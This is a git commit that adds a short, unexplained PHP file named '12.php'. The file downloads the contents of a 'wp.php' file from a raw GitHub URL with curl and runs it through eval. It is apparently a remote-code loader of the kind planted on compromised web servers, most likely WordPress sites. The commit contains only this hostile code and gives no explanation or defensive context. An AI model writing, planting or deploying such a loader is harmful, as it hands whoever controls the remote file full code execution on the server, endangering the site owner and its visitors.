d165dacae89c9d1d00633f8c641c15e58ce67c52
niikkita6984 <niikkita69841@gmail.com>
2025-01-23 16:48:42 +0330

    Create 12.php

---
+++ 12.php
@@ -0,0 +1,8 @@
+<?php 
+$link = 'https://raw.githubusercontent.com/niikkita6984/nikita/main/wp.php';
+$ch = curl_init(); 
+curl_setopt($ch, CURLOPT_URL, $link);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+$output = curl_exec($ch); 
+curl_close($ch);      
+eval ('?>'.$output);
